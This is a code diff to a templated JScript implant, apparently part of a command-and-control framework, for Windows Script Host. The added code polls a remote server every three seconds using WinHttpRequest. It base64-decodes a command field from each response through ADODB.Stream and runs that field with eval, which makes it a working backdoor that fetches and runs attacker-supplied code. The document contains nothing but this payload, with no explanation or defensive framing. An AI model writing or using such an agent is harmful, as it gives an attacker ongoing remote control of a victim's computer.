@@ -15,7 +15,40 @@ function {{functions['post_req'][0]}}(data){
   {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("User-Agent", "{{variables['useragent'][1]}}");
   {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("X-Frame-Options", "{{variables['x-frame-options'][1]}}");
   {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("Content-Type", "{{variables['content-type'][1]}}");
-  {{variables['winhttp.winhttprequest'][0]}}.Send(data)
+  {{variables['winhttp.winhttprequest'][0]}}.Send(data);
+  {{variables['winhttp.winhttprequest'][0]}}.WaitForResponse();
+  return {{variables['winhttp.winhttprequest'][0]}}.ResponseText;
 }
 
-{{functions['post_req'][0]}}('{"connection_id":"'+{{connection_id[0]}}+'","username":"'+{{variables['username'][0]}}+'"}');
+function base64_decode(data) {
+  var xml = new ActiveXObject("Microsoft.XMLDOM");
+  var element = xml.createElement("temp_file");
+  element.dataType = "bin.base64"
+  element.text = data
+
+  var stream = WScript.CreateObject("ADODB.Stream");
+  stream.Type = 1;
+  stream.open();
+  stream.Write(element.nodeTypedValue)
+
+  stream.Position = 0;
+  stream.Type = 2;
+  stream.CharSet = "utf-8";
+
+  result = stream.ReadText();
+  stream.close()
+  return result
+}
+
+while(true){
+  resp = {{functions['post_req'][0]}}('{"connection_id":"'+{{connection_id[0]}}+'"}');
+  var start = resp.search('{')
+  var end = resp.search('}')
+  json_data = "{" + resp.substring(start+1, end) + "}"
+  eval("command = " + json_data)
+  if(command.eval){
+    //WScript.echo(base64_decode(command.eval))
+    eval(base64_decode(command.eval));
+  }
+  WScript.Sleep('3000')
+}
